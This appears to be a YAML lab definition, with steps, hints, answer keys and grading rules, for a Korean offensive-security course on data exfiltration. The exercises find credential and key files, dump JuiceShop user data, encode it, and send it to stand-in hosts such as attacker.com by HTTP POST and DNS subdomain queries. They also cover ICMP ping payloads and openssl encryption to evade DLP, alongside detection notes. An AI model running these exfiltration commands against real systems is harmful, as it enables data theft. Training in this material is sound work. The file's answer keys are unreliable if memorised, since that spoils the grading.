lab_id: attack-nonai-week11
title: 데이터 유출 (Data Exfiltration)
version: non-ai
course: attack-nonai
week: 11
description: 침해된 시스템에서 민감한 데이터를 외부로 유출하는 다양한 기법을 실습한다. HTTP, DNS, ICMP 터널링, 스테가노그래피
  등 탐지를 회피하는 유출 기법과 방어 방법을 학습한다.
difficulty: medium
duration_minutes: 120
objectives:
- 데이터 유출의 다양한 채널(HTTP, DNS, ICMP)을 이해한다
- 인코딩과 암호화를 통한 은밀한 데이터 전송을 수행할 수 있다
- DLP(Data Loss Prevention) 관점에서 유출 탐지 방법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터
    파일을 검색하라.
  hint: |
    find 명령으로 .conf, .env, .key, .pem 등의 파일을 검색한다.

    📎 도구 우선순위 (힌트):
    1) 우선: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf" -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null | head -20'
    2) 미설치: 기본 coreutils
    3) 실패/대안:
       - locate *.env (mlocate db)
       - LinPEAS files 섹션
       - linenum.sh
       - linux-smart-enumeration
       - trufflehog filesystem (시크릿 정밀)
       - gitleaks (git 이력)
       - find -size 단위 + grep
       - rga (ripgrep-all 콘텐츠 검색)
    4) 검증: T1005 Data from Local + T1083 File Discovery.
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf"
    -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null
    | head -20' 2>/dev/null
  answer_detail: 데이터 유출의 첫 단계는 가치 있는 데이터를 식별하는 것이다. 설정 파일(자격 증명), 키 파일(인증서), 데이터 덤프(SQL)
    등이 주요 대상이다. MITRE ATT&CK의 Collection 전술에 해당한다.
  verify:
    type: output_contains
    expect: /
    field: stdout
    semantic:
      intent: 민감 파일 식별 — ssh ccc@10.20.30.80 'find /etc /home /var/www -type f ( -name
        *.conf -o -name *.env -o -name *.key -o -name *.pem -o -name *.sql )'. MITRE
        T1005 Data from Local System + T1083. Collection 전술 첫 단계 — 가치 있는 데이터(credentials/key/SQL
        dump) 식별.
      success_criteria:
      - find + 확장자 필터 (.conf/.env/.key/.pem/.sql)
      - 민감 디렉터리 3곳 (/etc/home/var/www)
      - 파일 경로 출력
      acceptable_methods:
      - "find + 확장자 필터 (수기 baseline)."
      - "locate *.env."
      - "LinPEAS files."
      - "linenum.sh."
      - "linux-smart-enumeration."
      - "trufflehog filesystem."
      - "gitleaks."
      - "rga ripgrep-all."
      negative_signs:
      - 확장자 필터 없음
      - 단일 디렉터리만
      - 민감 키워드 맥락 없음
  target_vm: attacker
- order: 2
  instruction: JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장하라.
  hint: |
    이전 week에서 배운 SQLi 기법으로 사용자 정보를 추출한다.

    📎 도구 우선순위 (힌트):
    1) 우선: curl -s http://10.20.30.80:3000/api/Users | python3 -c "..." > /tmp/exfil_users.csv && wc -l + head
    2) 미설치: sudo apt install -y curl python3
    3) 실패/대안:
       - sqlmap --dump
       - Burp Intruder bulk extract
       - jq -r 변환
       - mysqldump (DB 직접)
       - pg_dump (PostgreSQL)
       - mongoexport (NoSQL)
       - Nemesida WAF 우회
       - DBeaver / Navicat GUI export
    4) 검증: T1005 + T1213 + OWASP API2:2023.
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    users=json.load(sys.stdin)[''data'']; [print(f\"{u[''id'']},{u[''email'']}\")
    for u in users]" > /tmp/exfil_users.csv && echo ''Extracted users:'' && wc -l
    /tmp/exfil_users.csv && head -5 /tmp/exfil_users.csv'
  answer_detail: 데이터 추출 후 CSV나 JSON 형식으로 저장하면 후속 처리가 용이하다. 실전에서는 대량 데이터를 청크로 나누어 점진적으로
    유출하여 탐지를 회피한다.
  verify:
    type: output_contains
    expect:
    - Extracted users
    - csv
    field: stdout
    semantic:
      intent: JuiceShop API 사용자 데이터 추출 — curl http://10.20.30.80:3000/api/Users |
        python3 파싱 > /tmp/exfil_users.csv. MITRE T1005 + T1213 Data from Information
        Repositories. OWASP API2:2023 Broken Authentication — 인증 없이 사용자 DB 노출.
      success_criteria:
      - curl /api/Users + JSON 파싱
      - CSV 저장 + Extracted users 키워드
      - wc -l로 추출 건수 검증
      acceptable_methods:
      - "curl + jq/python 파싱 (수기 baseline)."
      - "sqlmap --dump."
      - "Burp Intruder bulk extract."
      - "jq -r 변환."
      - "mysqldump (직접)."
      - "pg_dump."
      - "mongoexport (NoSQL)."
      - "DBeaver / Navicat export."
      negative_signs:
      - API 호출 없음
      - CSV 저장 없음
      - 파싱 도구 없음
  target_vm: attacker
- order: 3
  instruction: 추출한 데이터를 Base64로 인코딩하여 전송 준비를 하라.
  hint: |
    base64 명령으로 파일을 인코딩한다.

    📎 도구 우선순위 (힌트):
    1) 우선: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && wc -c 비교
    2) 미설치: 기본 coreutils
    3) 실패/대안:
       - base32 (DNS 친화적, 32% ↑)
       - base85 / Ascii85 (작음)
       - openssl base64 -e
       - python3 base64.b64encode
       - perl encode_base64
       - hex (xxd -p)
       - URL-safe base64 (-base64url)
       - Bastion AI 인코딩 audit
    4) 검증: T1132.001 Standard Encoding.
  category: exploit
  points: 10
  answer: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:'
    && wc -c /tmp/exfil_users.csv && echo 'Encoded size:' && wc -c /tmp/exfil_encoded.txt
    && echo 'Preview:' && head -3 /tmp/exfil_encoded.txt
  answer_detail: Base64 인코딩은 바이너리 데이터를 텍스트로 변환하여 텍스트 기반 채널(HTTP, DNS)을 통해 전송할 수 있게
    한다. 크기가 약 33% 증가하지만, DLP 시스템의 패턴 매칭을 회피할 수 있다.
  verify:
    type: output_contains
    expect: Original size
    field: stdout
    semantic:
      intent: Base64 인코딩 — base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt &&
        wc -c 원본/인코딩 비교. MITRE T1132.001 Standard Encoding. 바이너리→텍스트 변환으로 HTTP/DNS
        텍스트 채널 전송 가능. 약 33% 크기 증가 but DLP 패턴 매칭 회피.
      success_criteria:
      - base64 명령 실행
      - Original size + Encoded size 비교
      - 인코딩 파일 생성
      acceptable_methods:
      - "base64 인코딩 + wc -c 비교 (수기 baseline)."
      - "base32 DNS 친화적."
      - "base85 / Ascii85."
      - "openssl base64 -e."
      - "python3 base64.b64encode."
      - "perl encode_base64."
      - "xxd -p hex."
      - "URL-safe base64."
      negative_signs:
      - 인코딩 없음
      - 크기 비교 없음
      - raw 전송
  target_vm: attacker
- order: 4
  instruction: HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을 시연하라.
  hint: |
    curl -X POST -d @파일 형태로 데이터를 전송한다.

    📎 도구 우선순위 (힌트):
    1) 우선: curl -X POST -d @/tmp/exfil_encoded.txt http://attacker_ip:8080/upload
    2) 미설치: sudo apt install -y curl
    3) 실패/대안:
       - wget --post-file=
       - python3 requests.post
       - httpie POST @file
       - netcat (raw HTTP)
       - aria2c -d 데이터 분할
       - axel (멀티 connection)
       - rclone (cloud sync)
       - pastebinit (CLI pastebin)
    4) 검증: T1041 Exfiltration over C2 Channel. HTTPS 권장.
  category: exploit
  points: 10
  answer: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X
    POST -d @/tmp/exfil_encoded.txt http://attacker.com/collect'' && echo ''---''
    && echo ''With headers disguise:'' && echo ''curl -X POST -H "Content-Type: application/json"
    -d "{\"log\":\"$(head -1 /tmp/exfil_encoded.txt)\"}" http://attacker.com/api/logs''
    && echo ''---'' && echo ''HTTP exfil detected by: proxy logs, DLP, unusual POST
    sizes'''
  answer_detail: HTTP를 통한 데이터 유출은 정상 웹 트래픽과 구분하기 어렵다. JSON API 요청으로 위장하거나 정상적인 클라우드
    서비스(pastebin, cloud storage)를 경유하면 탐지가 더 어려워진다.
  verify:
    type: output_contains
    expect: HTTP Exfiltration
    field: stdout
    semantic:
      intent: HTTP POST 유출 시뮬 — curl -X POST -d @/tmp/exfil_encoded.txt http://attacker/collect
        + JSON 위장 헤더. MITRE T1048.003 Exfiltration Over Unencrypted Protocol + T1041
        Exfiltration Over C2 Channel. 정상 웹 트래픽과 구분 어려움.
      success_criteria:
      - HTTP Exfiltration 키워드
      - curl -X POST -d @파일 형태
      - JSON/헤더 위장 예시
      acceptable_methods:
      - "curl POST + JSON 위장 (수기 baseline)."
      - "wget --post-file=."
      - "python3 requests.post."
      - "httpie POST @file."
      - "pastebin/Telegram/Discord webhook."
      - "cloud storage API (S3/GDrive/Dropbox)."
      - "rclone."
      - "Bastion AI exfil 시뮬 audit."
      negative_signs:
      - POST 예시 없음
      - 위장 기법 없음
      - 탐지 맥락 없음
  target_vm: attacker
- order: 5
  instruction: DNS 터널링을 통한 데이터 유출의 원리를 이해하라. 데이터를 DNS 쿼리의 서브도메인으로 인코딩하는 방법을 시연하라.
  hint: |
    데이터를 hex/base32로 인코딩하여 DNS 쿼리에 포함한다.

    📎 도구 우선순위 (힌트):
    1) 우선: echo 'data' | xxd -p | head -c 50 + dig $(...).attacker.com
    2) 미설치: sudo apt install -y dnsutils xxd
    3) 실패/대안:
       - DNScat2 (전문 DNS C2)
       - dnsteal (Python 도구)
       - iodine (IPv4 over DNS)
       - dnsdumpster + 자작 스크립트
       - Cobalt Strike DNS beacon
       - Empire DNS C2
       - dnscat 자동화
       - DNS-over-HTTPS (DoH) 회피
    4) 검증: T1071.004 DNS C2 + T1048.003 Exfil DNS.
  category: exploit
  points: 10
  answer: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''===
    DNS Tunneling Simulation ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED"
    && echo "DNS query: dig $ENCODED.exfil.attacker.com" && echo ''---'' && echo ''Real
    tools: iodine, dnscat2, DNSExfiltrator'' && echo ''Detection: unusually long DNS
    queries, high query volume to single domain'''
  answer_detail: 'DNS 터널링은 데이터를 DNS 쿼리의 서브도메인으로 인코딩하여 전송한다. DNS는 거의 모든 네트워크에서 허용되므로
    방화벽 우회에 효과적이다. 탐지: 비정상적으로 긴 도메인명, 단일 도메인에 대한 과다 쿼리.'
  verify:
    type: output_contains
    expect: DNS Tunneling
    field: stdout
    semantic:
      intent: 'DNS 터널링 — xxd -p로 hex 인코딩 후 서브도메인에 삽입, dig encoded.exfil.attacker.com.
        MITRE T1048.003 + T1071.004 DNS. iodine/dnscat2/DNSExfiltrator 도구. 탐지: 긴 도메인명
        + 단일 도메인 과다 쿼리.'
      success_criteria:
      - DNS Tunneling 키워드
      - xxd/base32 인코딩 + 서브도메인
      - iodine/dnscat2 도구 언급
      acceptable_methods:
      - "xxd + dig 서브도메인 (수기 baseline)."
      - "DNScat2 전문 C2."
      - "dnsteal (Python)."
      - "iodine IP-over-DNS."
      - "Cobalt Strike DNS beacon."
      - "Empire DNS C2."
      - "DoH 회피."
      - "Bastion AI DNS exfil audit."
      negative_signs:
      - DNS 쿼리 구성 없음
      - 인코딩 생략
      - 탐지 지표 없음
  target_vm: attacker
- order: 6
  instruction: ICMP 터널링의 원리를 이해하기 위해 ping 패킷에 커스텀 데이터를 포함하여 전송하라.
  hint: |
    ping -p 옵션으로 패턴 데이터를 지정할 수 있다.

    📎 도구 우선순위 (힌트):
    1) 우선: ping -c 3 -p 4142434445 attacker_ip (hex 패턴)
    2) 미설치: sudo apt install -y iputils-ping
    3) 실패/대안:
       - hping3 -1 -E file -d size (file payload)
       - icmptunnel (Linux ICMP C2)
       - icmpsh (Windows backdoor)
       - PingPyte (Python)
       - scapy IP/ICMP/Raw payload
       - skydog (ICMP TUN tunnel)
       - prism (ICMP shell)
       - Bastion AI ICMP exfil audit
    4) 검증: T1095 Non-Application Layer Protocol. ICMP 종종 허용.
  category: exploit
  points: 10
  answer: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in
    ICMP payload:'' && DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex: $DATA_HEX"
    && ping -c 1 -p $DATA_HEX 10.20.30.80 2>&1 | head -5 && echo ''---'' && echo ''Tools:
    icmpsh, ptunnel, icmptunnel'' && echo ''Detection: unusual ICMP packet sizes,
    high ICMP volume'''
  answer_detail: 'ICMP 터널링은 ping 패킷의 데이터 영역에 정보를 삽입하여 전송한다. 방화벽이 TCP/UDP를 차단해도 ICMP는
    허용하는 경우가 많다. 탐지: 비정상적인 ICMP 패킷 크기와 빈도를 모니터링한다.'
  verify:
    type: output_contains
    expect:
    - ICMP Tunneling
    - ping
    field: stdout
    semantic:
      intent: 'ICMP 터널링 — ping -p <hex> -c 1 10.20.30.80. MITRE T1048.003 + T1095
        Non-Application Layer Protocol. ICMP 페이로드 영역 데이터 삽입. 방화벽이 ICMP 허용 시 우회 효과.
        도구: icmpsh/ptunnel/icmptunnel. 탐지: 비정상 ICMP 크기/빈도.'
      success_criteria:
      - ICMP Tunneling 키워드
      - ping -p 패턴 사용
      - ICMP 도구 (icmpsh/ptunnel) 언급
      acceptable_methods:
      - "ping -p hex 패턴 (수기 baseline)."
      - "hping3 -1 -E file."
      - "icmptunnel (Linux ICMP C2)."
      - "icmpsh."
      - "PingPyte (Python)."
      - "scapy IP/ICMP/Raw."
      - "skydog (ICMP TUN)."
      - "prism (ICMP shell)."
      negative_signs:
      - ping -p 없음
      - ICMP 페이로드 맥락 없음
      - 탐지 없음
  target_vm: attacker
- order: 7
  instruction: 데이터를 암호화하여 유출하는 방법을 시연하라. openssl로 AES-256 암호화를 적용하라.
  hint: |
    openssl enc -aes-256-cbc 옵션으로 파일을 암호화한다.

    📎 도구 우선순위 (힌트):
    1) 우선: openssl enc -aes-256-cbc -salt -pbkdf2 -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin -k secretpassword
    2) 미설치: sudo apt install -y openssl
    3) 실패/대안:
       - gpg --symmetric --cipher-algo AES256
       - 7z a -p<pw> -mhe=on (헤더 암호화)
       - age (modern, age-encryption.org)
       - rage (Rust impl of age)
       - python cryptography Fernet
       - openssl enc -chacha20
       - veracrypt (volume)
       - cryptsetup luks (block device)
    4) 검증: T1027 + T1573 Encrypted Channel.
  category: exploit
  points: 10
  answer: 'openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin
    -pass pass:exfil_key_2026 -pbkdf2 2>/dev/null && echo ''Encrypted file:'' && file
    /tmp/exfil_encrypted.bin && ls -la /tmp/exfil_encrypted.bin && echo ''---'' &&
    echo ''Decryption: openssl enc -d -aes-256-cbc -in exfil_encrypted.bin -pass pass:key
    -pbkdf2'''
  answer_detail: 암호화된 데이터는 DLP 시스템의 콘텐츠 검사를 완전히 회피한다. 개인정보, 신용카드 번호 등의 패턴 매칭이 불가능해지므로,
    네트워크 행위 기반 탐지(비정상 전송 패턴)에 의존해야 한다.
  verify:
    type: output_contains
    expect: Encrypted file
    field: stdout
    semantic:
      intent: AES-256 암호화 유출 — openssl enc -aes-256-cbc -salt -in csv -out bin -pass
        pass:key -pbkdf2. MITRE T1022 Data Encrypted (legacy) + T1560.001 Archive
        via Utility. DLP 콘텐츠 검사 완전 회피 → 네트워크 행위 기반 탐지만 가능.
      success_criteria:
      - openssl enc -aes-256-cbc + -pbkdf2
      - Encrypted file 키워드 + file 명령 검증
      - 복호화 역과정 설명
      acceptable_methods:
